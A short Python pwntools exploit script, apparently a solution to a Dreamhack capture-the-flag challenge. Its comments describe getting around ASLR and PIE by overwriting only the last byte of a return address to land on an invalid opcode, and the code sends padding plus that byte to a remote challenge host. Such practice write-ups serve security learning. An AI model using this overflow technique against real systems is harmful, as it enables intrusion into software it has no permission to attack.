# Scenario
# It is impossible to know libc_base because of aslr && pie
# Use Last 12 bit of Return Adress never change
# Operation SIGILL occurs when it meets a command with an unspecified opcode like (bad) or ud2
# Return Address is 0x55555555534b <main+18> , so Add 1 each and look for the (bad) opcode in the main

# Explot
# pwndbg> x/i  0x000055555555534b +11
# 0x555555555356 <main+14>:    (bad)
# After that bring the last 1 byte about it

from pwn import *

r = remote('host8.dreamhack.games', 20093)

r.sendlineafter("size: ", str(400))
r.send(b'A' * 0x108 + b'\56')
r.interactive()
